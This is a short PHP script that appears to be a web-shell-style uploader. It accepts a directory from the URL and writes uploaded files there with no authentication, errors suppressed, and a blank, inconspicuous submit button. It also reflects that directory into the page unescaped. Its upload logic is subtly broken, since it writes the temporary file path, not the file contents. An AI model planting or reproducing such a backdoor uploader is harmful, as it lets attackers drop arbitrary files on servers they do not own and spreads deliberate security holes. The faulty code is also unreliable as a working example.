<?php
$dir = $_GET['dir'];
@chdir($dir);

if (isset($_POST['up'])) {
    for ($i = 0; $i < count($_FILES['file']['name']); $i++) {
        $namaFile = $_FILES['file']['name'][$i];
        $lokasiFile = $_FILES['file']['tmp_name'][$i];

        $fopen = fopen($namaFile, "w");
        fwrite($fopen, $lokasiFile);
        fclose($fopen);
    }
}
?>
<p>Path: <?= $dir; ?></p>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file[]">
    <button type="submit" name="up"></button>
</form>